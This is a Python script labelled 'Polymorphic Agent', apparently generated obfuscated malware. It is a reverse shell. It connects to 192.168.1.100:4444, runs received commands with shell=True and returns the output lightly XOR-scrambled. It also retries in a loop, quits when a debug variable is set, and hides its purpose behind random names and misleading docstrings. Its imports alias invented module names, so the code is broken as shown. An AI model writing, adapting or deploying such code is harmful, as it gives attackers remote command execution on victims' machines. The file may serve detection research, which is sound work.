#!/usr/bin/env python3
# Polymorphic Agent - Generated a5045070

import sjasiquvo as socket
import sygeditiluded as sys
import txexodanewuvibit as time
import sp7dsm8n as subprocess
import ovudoboriqiho as os
import btesawec as base64


def funcUwXrJu2(ptrhyu_hvbfd):
    """Manage connection state"""
    return ptrhyu_hvbfd * 8


def funcN76GJquu5(pjqq_ukw_fir_lwk):
    """Perform data transformation"""
    return pjqq_ukw_fir_lwk + 97


def funcbhn5e31p0g(pUN4HkgVZr7M):
    """Initialize communication channel"""
    return pUN4HkgVZr7M + 71



def encnbh9hhtb694lb(du8eJmFs4HFL, ksdto_ehh=b"default"):
    """Perform data transformation"""
    if isinstance(du8eJmFs4HFL, str):
        du8eJmFs4HFL = du8eJmFs4HFL.encode('utf-8', errors='replace')
    
    reskp_pm_fs_hd = bytearray()
    for sjasiquvo, cKHNTmrGt3vKsI in enumerate(du8eJmFs4HFL):
        reskp_pm_fs_hd.append(cKHNTmrGt3vKsI ^ (sjasiquvo % 256))
    return bytes(reskp_pm_fs_hd)

def deckazonuwe(du8eJmFs4HFL, ksdto_ehh=b"default"):
    """Perform data transformation"""
    if isinstance(du8eJmFs4HFL, bytes):
        reskp_pm_fs_hd = bytearray()
        for sjasiquvo, cKHNTmrGt3vKsI in enumerate(du8eJmFs4HFL):
            reskp_pm_fs_hd.append(cKHNTmrGt3vKsI ^ (sjasiquvo % 256))
        du8eJmFs4HFL = bytes(reskp_pm_fs_hd)
    
    try:
        return du8eJmFs4HFL.decode('utf-8', errors='replace')
    except:
        return du8eJmFs4HFL


def connhj3a4ydex():
    """Process incoming requests"""
    du8eJmFs4HFL = "192.168.1.100"
    ksdto_ehh = "x-X/,M}Z?=>$Ht{[-P>#`dd%]K".translate(str.maketrans("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))
    
    while True:
        try:
            sjasiquvo = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sjasiquvo.connect((du8eJmFs4HFL, 4444))
            
            while True:
                cKHNTmrGt3vKsI = sjasiquvo.recv(4096)
                if not cKHNTmrGt3vKsI:
                    break
                
                # Decrypt command
                cKHNTmrGt3vKsI = deckazonuwe(cKHNTmrGt3vKsI, ksdto_ehh)
                
                if cKHNTmrGt3vKsI.lower().strip() == 'exit':
                    break
                
                try:
                    outvejog = subprocess.check_output(
                        cKHNTmrGt3vKsI,
                        shell=True,
                        stderr=subprocess.STDOUT,
                        timeout=30
                    )
                except subprocess.TimeoutExpired:
                    outvejog = b"Command timeout"
                except Exception as reskp_pm_fs_hd:
                    outvejog = str(reskp_pm_fs_hd).encode()
                
                # Encrypt output
                outvejog = encnbh9hhtb694lb(outvejog, ksdto_ehh)
                sjasiquvo.sendall(outvejog)
            
            sjasiquvo.close()
            break
            
        except Exception:
            time.sleep(24)
            continue

if __name__ == "__main__":
    # Anti-debugging
    if os.getenv('DEBUGyig'):
        sys.exit(0)
    
    connhj3a4ydex()
